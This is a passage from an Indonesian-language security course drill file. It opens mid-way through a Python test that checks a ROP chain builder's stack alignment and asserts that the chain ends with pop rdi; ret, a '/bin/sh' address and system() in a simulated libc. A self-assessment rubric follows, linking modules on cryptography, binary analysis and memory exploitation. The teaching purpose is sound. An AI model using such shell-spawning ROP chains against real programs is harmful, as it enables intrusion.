    print(f"Total kedalaman stack saat system() dipanggil: {total_qwords} QWORDs ({total_qwords * 8} bytes)")
    # Harus kelipatan 16 byte (total_qwords harus genap)
    assert total_qwords % 2 == 0, f"Stack TIDAK sejajar 16-byte! Total qwords: {total_qwords}"

    # 3. Verifikasi Isi Byte Payload
    # Unpack byte kembali ke list bilangan bulat 64-bit
    unpacked_chain = list(struct.unpack(f"<{len(payload_bytes)//8}Q", payload_bytes))
    print("Isi ROP Chain:")
    for idx, addr in enumerate(unpacked_chain):
        print(f"  [{idx}] {hex(addr)}")

    # Pastikan rantai diakhiri dengan alamat system()
    assert unpacked_chain[-1] == simulated_libc_base + gadget_db.system, "Akhir ROP chain bukan system()!"
    # Pastikan argumen kedua dari belakang adalah string "/bin/sh"
    assert unpacked_chain[-2] == simulated_libc_base + gadget_db.bin_sh, "Argumen RDI bukan /bin/sh!"
    # Pastikan gadget pemuat adalah pop rdi; ret
    assert unpacked_chain[-3] == simulated_libc_base + gadget_db.pop_rdi_ret, "Gadget bukan pop rdi; ret!"

    print("Pengujian ROP Chain Builder lolos 100% tanpa kesalahan alignment!")
```
</details>

---

## 5. Rubrik Evaluasi Mandiri & Peta Remediasi

| Skor Capaian | Klasifikasi Kemahiran | Rekomendasi Tindakan Remediasi |
|---|---|---|
| **0% – 40%** | **Novice** | Pelajari kembali fondasi kriptografi klasik dan simetris pada [Modul 168: Fondasi Kriptografi Klasik & Prinsip Kerckhoffs](../curriculum/11-cybersecurity-reverse-engineering/168-fondasi-kriptografi-klasik-prinsip-kerckhoffs.md) dan [Modul 170: Sandi Blok & Mode Operasi](../curriculum/11-cybersecurity-reverse-engineering/170-sandi-blok-mode-operasi.md). |
| **41% – 70%** | **Competent** | Kuasai kriptografi asimetris RSA dan analisis biner pada [Modul 172: Kriptografi Kunci Asimetris (RSA/ECC)](../curriculum/11-cybersecurity-reverse-engineering/172-kriptografi-kunci-asimetris.md) dan [Modul 177: Analisis Biner Statis & Dinamis](../curriculum/11-cybersecurity-reverse-engineering/177-reverse-engineering-analisis-biner.md). |
| **71% – 90%** | **Production-Grade** | Ulas eksploitasi memori tingkat rendah dan teknik bypass mitigasi pada [Modul 178: Eksploitasi Memori Tingkat Rendah (Pwn)](../curriculum/11-cybersecurity-reverse-engineering/178-eksploitasi-memori-tingkat-rendah-pwn.md) dan [Modul 179: Mitigasi Eksploitasi Memori & Cara Menembusnya](../curriculum/11-cybersecurity-reverse-engineering/179-mitigasi-eksploitasi-memori-cara-menembusnya.md). |
| **91% – 100%** | **Master** | Siap melanjutkan ke rekayasa kecerdasan buatan dan optimasi komputasi tensor pada [`tier-12-ai-deep-learning-drills.md`](./tier-12-ai-deep-learning-drills.md). |

### Peta Remediasi Topik Terkait:
- Modul 168: [Fondasi Kriptografi Klasik & Prinsip Kerckhoffs](../curriculum/11-cybersecurity-reverse-engineering/168-fondasi-kriptografi-klasik-prinsip-kerckhoffs.md)
- Modul 170: [Sandi Blok & Mode Operasi](../curriculum/11-cybersecurity-reverse-engineering/170-sandi-blok-mode-operasi.md)
- Modul 171: [Fungsi Hash Kriptografis & Kode Otentikasi](../curriculum/11-cybersecurity-reverse-engineering/171-fungsi-hash-kriptografis-kode-otentikasi.md)
- Modul 172: [Kriptografi Kunci Asimetris (RSA/ECC)](../curriculum/11-cybersecurity-reverse-engineering/172-kriptografi-kunci-asimetris.md)
- Modul 177: [Analisis Biner Statis & Dinamis](../curriculum/11-cybersecurity-reverse-engineering/177-reverse-engineering-analisis-biner.md)
- Modul 178: [Eksploitasi Memori Tingkat Rendah (Pwn)](../curriculum/11-cybersecurity-reverse-engineering/178-eksploitasi-memori-tingkat-rendah-pwn.md)
- Modul 179: [Mitigasi Eksploitasi Memori & Cara Menembusnya](../curriculum/11-cybersecurity-reverse-engineering/179-mitigasi-eksploitasi-memori-cara-menembusnya.md)
- Modul 180: [Eksploitasi Kernel Linux & Hardware Hacking](../curriculum/11-cybersecurity-reverse-engineering/180-eksploitasi-kernel-linux-hardware-hacking.md)
- Spaced Repetition: [`deck-08-cybersecurity-cryptography-pwn.md`](../flashcards/deck-08-cybersecurity-cryptography-pwn.md)
